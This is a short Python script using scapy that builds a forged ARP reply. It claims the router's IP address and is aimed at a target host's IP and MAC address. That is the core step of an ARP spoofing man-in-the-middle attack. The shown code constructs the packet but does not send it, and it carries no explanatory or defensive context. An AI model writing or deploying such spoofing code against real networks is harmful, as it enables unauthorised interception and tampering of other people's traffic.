#!/usr/bin/env python

import scapy.all as scapy
from source_details import router_source_ip
from target_details import target_ip, target_MAC

packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_MAC,
            psrc=router_source_ip)
